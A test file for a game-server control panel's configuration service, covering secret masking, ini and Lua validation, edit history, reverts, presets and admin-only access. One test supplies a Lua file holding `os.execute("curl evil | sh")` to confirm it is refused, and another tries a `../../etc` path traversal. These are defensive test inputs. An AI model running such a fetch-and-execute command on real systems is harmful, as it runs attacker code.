import { copyFileSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import type { ConfigIssue, PanelAdapter } from '@gsp/adapter-api';
import { panelAdapter, panelAdapters } from '@gsp/adapters/panel';
import { getPath, iniToRecord, parseIni, parseLuaData } from '@gsp/formats';
import { MASK } from '../src/config/service';
import { Client, fakeStatus, makePanel, ownerReady, type TestPanel } from './harness';

const fixtures = fileURLToPath(new URL('../../../fixtures/pz/b42/config/', import.meta.url));

async function setup(opts: { withFiles?: boolean; adapters?: readonly PanelAdapter[] } = { withFiles: true }) {
  const p = await makePanel({}, opts.adapters ? { adapters: opts.adapters } : {});
  const dir = path.join(p.deps.env.pzDataDir, 'Server');
  if (opts.withFiles) {
    mkdirSync(dir, { recursive: true });
    copyFileSync(path.join(fixtures, 'server.en.ini'), path.join(dir, 'zomboid.ini'));
    copyFileSync(path.join(fixtures, 'SandboxVars.en.lua'), path.join(dir, 'zomboid_SandboxVars.lua'));
    copyFileSync(path.join(fixtures, 'spawnregions.lua'), path.join(dir, 'zomboid_spawnregions.lua'));
  }
  const { client } = await ownerReady(p);
  return { p, c: client, dir };
}

/** Where the game keeps a server file (`Server/<name><suffix>`), read directly by these tests. */
const serverFile = (p: TestPanel, suffix: string) => path.join(p.deps.env.pzDataDir, 'Server', `${p.deps.env.serverName}${suffix}`);
const ini = (p: TestPanel) => iniToRecord(parseIni(readFileSync(serverFile(p, '.ini'), 'utf8')));

/** A form save: propose the key changes, then apply them (what the web does after its preview). */
async function save(c: Client, fileId: string, changes: Record<string, unknown>) {
  const proposed = await c.post('/api/servers/default/config/proposals', { fileId, changes });
  if (proposed.statusCode !== 200) return proposed;
  const { id } = proposed.json() as { id: string | null };
  return id ? c.post(`/api/servers/default/config/proposals/${id}/apply`) : proposed;
}

describe('server settings (ini)', () => {
  it('reads values with secrets masked', async () => {
    const { c } = await setup();
    const r = (await c.get('/api/servers/default/config/values?id=ini')).json() as { values: Record<string, string>; missing: boolean; sha256: string };
    expect(r.missing).toBe(false);
    expect(r.values.PVP).toBe('true');
    expect(r.values.RCONPassword).toBe(MASK);
    expect(r.values.Password).toBe('');
    expect(r.sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it('edits values in place and keeps an untouched secret', async () => {
    const { p, c } = await setup();
    await save(c, 'ini', { Password: 'unirse-2026' });
    const r = await save(c, 'ini', { PVP: 'false', MaxPlayers: '16', Password: MASK });
    expect(r.json()).toMatchObject({ applied: 'next-start', warnings: [], restartNeeded: false, changedKeys: ['PVP'] });
    expect(ini(p)).toMatchObject({ PVP: 'false', MaxPlayers: '16', Password: 'unirse-2026', RCONPassword: '<RCON_PASSWORD>' });
    // The audit log names the keys, never the values.
    const audit = p.deps.audit.list({ action: 'config.apply' });
    expect(audit).toHaveLength(2);
    expect(audit.map((a) => a.detail).join()).not.toContain('unirse-2026');
    expect(audit[1]!.detail).toContain('Password');
  });

  it('validates against the bilingual metadata and refuses managed or unknown keys', async () => {
    const { c } = await setup();
    const r = await c.post('/api/servers/default/config/proposals', { fileId: 'ini', changes: { SafetyToggleTimer: '5000', PVP: 'maybe', RCONPort: '1', Nope: '1', PublicName: 'x\ny' } });
    expect(r.statusCode).toBe(400);
    expect(r.json()).toMatchObject({
      error: 'invalid-options',
      fields: { SafetyToggleTimer: 'must be at most 1000', PVP: 'must be true or false', RCONPort: 'managed', Nope: 'unknown-option', PublicName: 'must be a single line' },
    });
  });

  it('applies live on a running server and reports options the game rejected (CFG-05)', async () => {
    const { p, c } = await setup();
    p.feed.status_ = fakeStatus({ state: 'running' });
    p.agent.command = async (cmd) => {
      p.agent.calls.push(`command:${cmd}`);
      // What 42.20.4 logs for a value it can't parse.
      p.feed.emit({ type: 'log', stream: 'out', line: 'LOG  : General      f:0 st:1> ERROR IntegerConfigOption.parse() "ChatMessageSlowModeTime" string="abc"' });
      return { via: 'rcon', output: '' };
    };
    const proposed = (await c.post('/api/servers/default/config/proposals', { fileId: 'ini', changes: { PVP: 'false', PublicName: 'Zombies Jatisheados' } })).json() as { id: string; applies: string };
    expect(proposed.applies).toBe('restart');
    const r = (await c.post(`/api/servers/default/config/proposals/${proposed.id}/apply`)).json() as { applied: string; warnings: string[]; restartNeeded: boolean };
    expect(p.agent.calls).toContain('command:reloadoptions');
    expect(r).toMatchObject({ applied: 'live', warnings: ['ChatMessageSlowModeTime: abc'], restartNeeded: true });
    expect((await c.get('/api/servers/default/config/pending')).json()).toMatchObject({ reasons: ['PublicName'] });
    // A live-only change says so before it is applied.
    expect(((await c.post('/api/servers/default/config/proposals', { fileId: 'ini', changes: { PauseEmpty: 'true' } })).json() as { applies: string }).applies).toBe('live');
  });

  it('puts back what the panel saved to a file the game rewrote from memory, before the next start it makes; the game’s own keys stay (CFG-05)', async () => {
    // PZ doesn't rewrite its ini: the same adapter, with the ini declared as a file the game rewrites.
    const pz = panelAdapter('pz');
    const rewritten: PanelAdapter = { ...pz, config: { ...pz.config, files: (srv) => pz.config.files(srv).map((f) => (f.id === 'ini' ? { ...f, reapplyAtStart: true } : f)) } };
    const { p, c } = await setup({ withFiles: true, adapters: [rewritten, ...panelAdapters.filter((a) => a.meta.id !== 'pz')] });
    const started = async () => {
      expect((await c.post('/api/servers/default/server/start')).statusCode).toBe(200);
      await p.srv.ops.idle();
      expect(p.srv.ops.last()).toMatchObject({ kind: 'start', ok: true });
    };
    const before = readFileSync(serverFile(p, '.ini'), 'utf8');
    p.feed.status_ = fakeStatus({ state: 'running' });
    // Saved while the game runs: a form change and a raw edit (managed keys are the agent's, never recorded).
    expect((await save(c, 'ini', { PublicName: 'Saved in the panel', PVP: 'false' })).statusCode).toBe(200);
    expect((await c.post('/api/servers/default/config/proposals', { fileId: 'ini', text: readFileSync(serverFile(p, '.ini'), 'utf8').replace(/^MaxPlayers=.*$/m, 'MaxPlayers=12') })).statusCode).toBe(200);
    const proposal = ((await c.get('/api/servers/default/config/proposals')).json() as { id: string }[])[0]!;
    expect((await c.post(`/api/servers/default/config/proposals/${proposal.id}/apply`)).statusCode).toBe(200);
    // A value the running game took itself (adapter code says so): nothing to put back for it.
    await p.srv.handle.ctx('alice').config.set('ini', { PVP: 'false' }, 'the game took it live', { live: true });
    // The game writes the file from what it loaded at its start, plus a change of its own.
    writeFileSync(serverFile(p, '.ini'), before.replace(/^Public=.*$/m, 'Public=true'));
    p.feed.status_ = fakeStatus({ state: 'stopped' });
    await started();
    expect(ini(p)).toMatchObject({ PublicName: 'Saved in the panel', MaxPlayers: '12', Public: 'true', PVP: 'true' });
    const history = p.srv.config.historyOf('ini');
    expect(history[0]).toMatchObject({ username: null, note: 'kept the settings saved in the panel since the last start (the game rewrote the file): PublicName, MaxPlayers' });
    expect(history[1]).toMatchObject({ note: 'on disk before this change' });
    // Put back once: what the game writes after that start is the game's.
    writeFileSync(serverFile(p, '.ini'), before);
    await started();
    expect(ini(p).PublicName).toBe(iniToRecord(parseIni(before)).PublicName);
    // A restore or reset that replaces the file forgets them.
    expect((await save(c, 'ini', { PublicName: 'Saved again' })).statusCode).toBe(200);
    p.srv.config.forgetPanelEdits(['Server']);
    writeFileSync(serverFile(p, '.ini'), before);
    await started();
    expect(ini(p).PublicName).toBe(iniToRecord(parseIni(before)).PublicName);
    // A file that doesn't parse now keeps the values for the next start, and the start goes on.
    expect((await save(c, 'ini', { PublicName: 'Saved once more' })).statusCode).toBe(200);
    writeFileSync(serverFile(p, '.ini'), `${before}\nthis line is not a setting\n`);
    await started();
    expect(p.srv.settings.getRaw('config.panelEdits')).toEqual({ ini: { PublicName: 'Saved once more' } });
    writeFileSync(serverFile(p, '.ini'), before);
    await started();
    expect(ini(p).PublicName).toBe('Saved once more');
    expect(p.agent.calls.filter((x) => x === 'start')).toHaveLength(5);
  });

  it('leaves a file the game does not rewrite as it is at a start (CFG-05)', async () => {
    const { p, c } = await setup();
    p.feed.status_ = fakeStatus({ state: 'running' });
    expect((await save(c, 'ini', { PublicName: 'Saved in the panel' })).statusCode).toBe(200);
    const onDisk = readFileSync(serverFile(p, '.ini'), 'utf8').replace(/^PublicName=.*$/m, 'PublicName=Changed by hand');
    writeFileSync(serverFile(p, '.ini'), onDisk);
    p.feed.status_ = fakeStatus({ state: 'stopped' });
    expect((await c.post('/api/servers/default/server/start')).statusCode).toBe(200);
    await p.srv.ops.idle();
    expect(readFileSync(serverFile(p, '.ini'), 'utf8')).toBe(onDisk);
    expect(p.srv.settings.getRaw('config.panelEdits')).toBeNull();
  });

  it('refuses writes while the server is booting, and the proposal waits', async () => {
    const { p, c } = await setup();
    const { id } = (await c.post('/api/servers/default/config/proposals', { fileId: 'ini', changes: { PVP: 'false' } })).json() as { id: string };
    p.feed.status_ = fakeStatus({ state: 'starting' });
    expect((await c.post(`/api/servers/default/config/proposals/${id}/apply`)).json()).toEqual({ error: 'server-busy' });
    p.feed.status_ = fakeStatus({ state: 'stopped' });
    expect((await c.post(`/api/servers/default/config/proposals/${id}/apply`)).statusCode).toBe(200);
    expect(ini(p).PVP).toBe('false');
  });

  it('puts managed keys back on raw edits, says why, and masks secrets in the text (CFG-04, CFG-08)', async () => {
    const { p, c } = await setup();
    const content = (await c.get('/api/servers/default/config/files/content?id=ini')).json() as { text: string; sha256: string; managedKeys: string[]; readonlyReason: string | null; format: string; highlight: string };
    expect(content).toMatchObject({ format: 'ini', highlight: 'properties', readonlyReason: null });
    expect(content.managedKeys).toContain('DefaultPort');
    expect(content.text).toContain(`RCONPassword=${MASK}`);
    expect(content.text).not.toContain('<RCON_PASSWORD>');
    const edited = content.text.replace('PVP=true', 'PVP=false').replace('DefaultPort=16261', 'DefaultPort=1');
    const proposed = (await c.post('/api/servers/default/config/proposals', { fileId: 'ini', text: edited, baseSha256: content.sha256 })).json() as { id: string; reapplied: unknown[]; diff: unknown[] };
    expect(proposed.reapplied).toEqual([
      { key: 'DefaultPort', value: '16261', why: 'managed' },
      { key: 'UPnP', value: 'false', why: 'set-by-panel' },
    ]);
    const applied = (await c.post(`/api/servers/default/config/proposals/${proposed.id}/apply`)).json();
    expect(applied).toMatchObject({ applied: 'next-start', changedKeys: ['PVP', 'UPnP'] });
    expect(ini(p)).toMatchObject({ PVP: 'false', DefaultPort: '16261', UPnP: 'false', RCONPassword: '<RCON_PASSWORD>' });
    // The game's comments stay (CFG-09).
    expect(readFileSync(serverFile(p, '.ini'), 'utf8')).toContain('# Players can hurt and kill other players');
  });

  it('seeds a first-run ini before the first start', async () => {
    const { p, c } = await setup({ withFiles: false });
    expect((await c.get('/api/servers/default/config/values?id=ini')).json()).toEqual({ values: {}, missing: true, sha256: null });
    await c.post('/api/servers/default/server/start');
    await p.srv.ops.idle();
    expect(ini(p)).toEqual({ SaveWorldEveryMinutes: '10' });
    expect(p.srv.config.historyOf('ini').map((h) => h.note)).toEqual(['first-run defaults']);
  });

  it('keeps working for the services that call the store directly, all asynchronously', async () => {
    const { p } = await setup();
    const config = p.srv.config;
    expect((await config.values('ini')).values.RCONPassword).toBe(MASK);
    await config.setDirect('ini', { Mods: 'modA;modB' }, 'alice', 'mod list');
    expect(ini(p).Mods).toBe('modA;modB');
    expect(config.historyOf('ini')[0]).toMatchObject({ note: 'mod list', username: 'alice' });
    expect(await config.read('ini')).toContain('Mods=modA;modB');
    // Only declared files, and a missing one is left alone.
    await expect(config.setDirect('path:data/Server/zomboid_notes.ini', { A: '1' }, null, 'x')).rejects.toThrow(/unknown-file/);
    await config.setDirect('spawnpoints', { A: '1' }, null, 'x');
    expect(await config.read('spawnpoints')).toBeNull();
    expect(await config.commit('spawnregions', 'function SpawnRegions() return {} end', 'alice', 'raw edit')).toMatchObject({ applied: 'next-start' });
    await expect(config.commit('sandbox', 'SandboxVars = { a = os.exit() }', 'alice', 'raw edit')).rejects.toThrow(/invalid-file/);
    expect((await config.content('ini')).text).toContain(`RCONPassword=${MASK}`);
    // Nothing to seed: the ini exists.
    expect(await config.seedIfMissing()).toBe(false);
  });
});

describe('sandbox', () => {
  it('reads and edits nested options by path', async () => {
    const { p, c } = await setup();
    const r = (await c.get('/api/servers/default/config/values?id=sandbox')).json() as { values: Record<string, unknown> };
    expect(r.values['ZombieLore.Speed']).toBe(4);
    const put = await save(c, 'sandbox', { 'ZombieLore.Speed': 1, 'Map.AllowMiniMap': true, 'MultiplierConfig.Global': 2.5 });
    expect(put.statusCode).toBe(200);
    const f = parseLuaData(readFileSync(serverFile(p, '_SandboxVars.lua'), 'utf8'));
    expect(getPath(f.table, 'ZombieLore.Speed')!.value).toMatchObject({ value: 1 });
    expect(getPath(f.table, 'MultiplierConfig.Global')!.value).toMatchObject({ raw: '2.5' });
    expect((await save(c, 'sandbox', { 'ZombieLore.Speed': 9 })).json()).toMatchObject({ fields: { 'ZombieLore.Speed': 'is not one of the allowed choices' } });
  });

  it('rejects raw Lua that is not plain data, and a Lua file of the wrong shape (CFG-02)', async () => {
    const { p, c } = await setup();
    const before = readFileSync(serverFile(p, '_SandboxVars.lua'), 'utf8');
    const evil = 'SandboxVars = {\n  Zombies = os.execute("curl evil | sh"),\n}';
    const r = await c.post('/api/servers/default/config/proposals', { fileId: 'sandbox', text: evil });
    expect(r.statusCode).toBe(400);
    expect(r.json()).toMatchObject({ error: 'invalid-file', issues: [{ line: 2, col: 15, message: 'Unexpected character "."' }] });
    expect((await c.post('/api/servers/default/config/proposals', { fileId: 'spawnregions', text: 'SandboxVars = {}' })).json()).toMatchObject({
      error: 'invalid-file',
      issues: [{ message: expect.stringMatching(/function SpawnRegions\(\) return/) }],
    });
    expect(readFileSync(serverFile(p, '_SandboxVars.lua'), 'utf8')).toBe(before);
    expect((await c.get('/api/servers/default/config/proposals')).json()).toEqual([]);
  });

  it("refuses what the file's own check says the game can't load, says it in each language, and shows it for the file as it is (CFG-02, CFG-08)", async () => {
    // PZ's files declare no check: the same adapter, with one on its ini that refuses a made-up marker.
    const check = (text: string): ConfigIssue[] =>
      text.split('\n').flatMap((l, i) => (l.includes('NOT-FOR-THE-GAME') ? [{ line: i + 1, col: 1, message: { en: 'The game cannot load this line', es: 'El juego no puede cargar esta línea' } }] : []));
    const pz = panelAdapter('pz');
    const checked: PanelAdapter = { ...pz, config: { ...pz.config, files: (srv) => pz.config.files(srv).map((f) => (f.id === 'ini' ? { ...f, check } : f)) } };
    const { p, c } = await setup({ withFiles: true, adapters: [checked, ...panelAdapters.filter((a) => a.meta.id !== 'pz')] });
    const before = readFileSync(serverFile(p, '.ini'), 'utf8');
    const text = before.replace(/^PublicName=.*$/m, 'PublicName=NOT-FOR-THE-GAME');
    const line = text.split('\n').findIndex((l) => l.startsWith('PublicName=')) + 1;
    const r = await c.post('/api/servers/default/config/proposals', { fileId: 'ini', text });
    expect(r.statusCode).toBe(400);
    expect(r.json()).toEqual({ error: 'invalid-file', issues: [{ line, col: 1, message: 'The game cannot load this line', localized: { en: 'The game cannot load this line', es: 'El juego no puede cargar esta línea' } }] });
    // A form change goes through the same check.
    expect((await save(c, 'ini', { PublicName: 'NOT-FOR-THE-GAME' })).json()).toMatchObject({ error: 'invalid-file', issues: [{ line }] });
    expect(readFileSync(serverFile(p, '.ini'), 'utf8')).toBe(before);
    expect((await c.get('/api/servers/default/config/proposals')).json()).toEqual([]);
    // A file already like that on disk (written by something else) opens with the issue shown.
    writeFileSync(serverFile(p, '.ini'), text);
    expect(((await c.get('/api/servers/default/config/files/content?id=ini')).json() as { issues: unknown[] }).issues).toEqual([
      { line, col: 1, message: 'The game cannot load this line', localized: { en: 'The game cannot load this line', es: 'El juego no puede cargar esta línea' } },
    ]);
    // Fixing it saves.
    expect((await save(c, 'ini', { PublicName: 'Fixed' })).statusCode).toBe(200);
  });

  it('applies a game preset onto the options the file has (CFG-06)', async () => {
    const { p, c } = await setup();
    const presetDir = path.join(p.deps.env.pzInstallDir, 'media', 'lua', 'shared', 'Sandbox');
    mkdirSync(presetDir, { recursive: true });
    writeFileSync(path.join(presetDir, 'Apocalypse.lua'), 'return {\n    Version = 6,\n    Zombies = 1,\n    NotAnOption = 3,\n    ZombieLore = { Speed = 3, },\n}\n');
    expect((await c.get('/api/servers/default/config/meta')).json()).toMatchObject({ presets: ['Apocalypse'], presetFile: 'sandbox' });
    const proposed = (await c.post('/api/servers/default/config/proposals', { fileId: 'sandbox', preset: 'Apocalypse' })).json() as { id: string; changedKeys: string[]; applies: string };
    expect(proposed).toMatchObject({ changedKeys: ['Zombies', 'ZombieLore.Speed'], applies: 'restart' });
    await c.post(`/api/servers/default/config/proposals/${proposed.id}/apply`);
    const v = ((await c.get('/api/servers/default/config/values?id=sandbox')).json() as { values: Record<string, unknown> }).values;
    expect(v).toMatchObject({ Zombies: 1, 'ZombieLore.Speed': 3 });
    expect(p.srv.config.historyOf('sandbox')[0]!.note).toBe('preset Apocalypse');
    expect((await c.post('/api/servers/default/config/proposals', { fileId: 'sandbox', preset: '../../etc' })).statusCode).toBe(404);
    // A preset only applies to the file the adapter names.
    expect((await c.post('/api/servers/default/config/proposals', { fileId: 'ini', preset: 'Apocalypse' })).statusCode).toBe(404);
    // The path the reset flow uses.
    expect(await p.srv.config.presets()).toEqual(['Apocalypse']);
    expect(await p.srv.config.applyPreset('Apocalypse', null, { force: true })).toMatchObject({ applied: 'unchanged', applied_keys: 2 });
  });
});

describe('history (CFG-03)', () => {
  it('records every change and reverts one, masking secrets in the view', async () => {
    const { p, c } = await setup();
    await save(c, 'ini', { PVP: 'false' });
    await save(c, 'ini', { MaxPlayers: '8' });
    const h = (await c.get('/api/servers/default/config/history?file=ini')).json() as { id: number; note: string; username: string | null }[];
    // The pre-existing file is captured before the first panel edit.
    expect(h.map((x) => x.note)).toEqual(['changed MaxPlayers', 'changed PVP', 'on disk before this change']);
    const v = (await c.get(`/api/servers/default/config/history/${h[0]!.id}`)).json() as { content: string; previous: string };
    expect(v.content).toContain(`RCONPassword=${MASK}`);
    expect(v.previous).toContain('MaxPlayers=16');
    await c.post(`/api/servers/default/config/history/${h[1]!.id}/revert`);
    expect(ini(p)).toMatchObject({ PVP: 'false', MaxPlayers: '16', RCONPassword: '<RCON_PASSWORD>' });
  });

  it('previews a revert as a proposal with its diff', async () => {
    const { p, c } = await setup();
    await save(c, 'ini', { PVP: 'false' });
    const [latest, original] = (await c.get('/api/servers/default/config/history?file=ini')).json() as { id: number }[];
    expect(latest).toBeDefined();
    const proposed = (await c.post('/api/servers/default/config/proposals', { fileId: 'ini', revert: original!.id })).json() as { id: string; changedKeys: string[]; diff: ({ kind: string; text: string } | null)[] };
    // Going back to the file as the game wrote it would turn UPnP on again: the panel keeps it off.
    expect(proposed.changedKeys).toEqual(['PVP']);
    expect(proposed.diff.filter((l) => l && l.kind !== 'same')).toEqual([
      { kind: 'del', text: 'PVP=false' },
      { kind: 'add', text: 'PVP=true' },
    ]);
    await c.post(`/api/servers/default/config/proposals/${proposed.id}/apply`);
    expect(ini(p).PVP).toBe('true');
    expect(p.srv.config.historyOf('ini')[0]!.note).toBe(`revert to version ${original!.id}`);
    expect((await c.post('/api/servers/default/config/proposals', { fileId: 'sandbox', revert: original!.id })).statusCode).toBe(404);
  });

  it('is admin-only', async () => {
    const { p, c } = await setup();
    await c.post('/api/users', { username: 'op1', password: 'Temporal-12345', role: 'operator' });
    const op = new Client(p.app);
    await op.post('/api/auth/login', { username: 'op1', password: 'Temporal-12345' });
    await op.post('/api/auth/password', { current: 'Temporal-12345', next: 'Operador-propio-1' });
    for (const url of ['/api/servers/default/config/values?id=ini', '/api/servers/default/config/meta', '/api/servers/default/config/files', '/api/servers/default/config/history?file=ini', '/api/servers/default/config/proposals']) expect((await op.get(url)).statusCode, url).toBe(403);
    expect((await op.post('/api/servers/default/config/proposals', { fileId: 'ini', changes: { PVP: 'false' } })).statusCode).toBe(403);
    expect((await op.get('/api/servers/default/config/pending')).statusCode).toBe(200);
  });

  it('the raw routes are gone', async () => {
    const { c } = await setup();
    for (const f of ['server', 'sandbox', 'spawnregions', 'spawnpoints']) expect((await c.get(`/api/servers/default/config/${f}/raw`)).statusCode).toBe(404);
  });
});
